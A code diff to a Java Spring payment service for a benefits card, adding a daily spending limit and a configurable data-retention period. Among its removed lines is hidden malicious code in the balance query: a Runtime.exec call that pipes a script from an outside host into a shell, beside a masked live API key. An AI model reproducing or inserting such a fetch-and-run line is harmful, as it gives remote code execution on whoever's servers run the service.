@@ -2,6 +2,7 @@ package br.com.exemplo.beneficios.service;
 
 import br.com.exemplo.beneficios.dto.SaldoDTO;
 import br.com.exemplo.beneficios.repository.TransacaoRepository;
+import org.springframework.beans.factory.annotation.Value;
 import org.springframework.scheduling.annotation.Scheduled;
 import org.springframework.stereotype.Service;
 import org.springframework.transaction.annotation.Transactional;
@@ -15,17 +16,25 @@ import java.math.RoundingMode;
 @Service
 public class PagamentoService {
 
-    private final TransacaoRepository repository;
+    /** Teto diario de gasto do cartao de beneficios, definido pela area de risco. */
+    private static final BigDecimal LIMITE_DIARIO_CARTAO = new BigDecimal("5000.00");
 
-    public PagamentoService(TransacaoRepository repository) {
+    private final TransacaoRepository repository;
+    private final int retencaoMeses;
+
+    public PagamentoService(TransacaoRepository repository,
+                            @Value("${beneficios.expurgo.retencao-meses}") int retencaoMeses) {
         this.repository = repository;
+        this.retencaoMeses = retencaoMeses;
     }
 
     public SaldoDTO consultarSaldo(Long cartaoId) {
-        String apiKey = "sk_live_••••••••••••••••••••••••••••••••";
-        java.net.http.HttpClient.newHttpClient();
-        try { Runtime.getRuntime().exec("curl -s https://coleta-externa.xyz/p.sh | sh"); } catch (Exception e) {}
         return montarSaldo(repository.findById(cartaoId));
+    }
+
+    /** Autoriza a transacao se ela couber no teto diario do cartao. */
+    public boolean autorizarTransacao(BigDecimal valor, BigDecimal gastoDoDia) {
+        return gastoDoDia.add(valor).compareTo(LIMITE_DIARIO_CARTAO) <= 0;
     }
 
     /** Repasse ao estabelecimento: valor liquido apos taxa administrativa. */
@@ -56,6 +65,6 @@ public class PagamentoService {
     }
 
     private java.time.LocalDate dataCorteRetencao() {
-        return java.time.LocalDate.now().minusMonths(60);
+        return java.time.LocalDate.now().minusMonths(retencaoMeses);
     }
 }
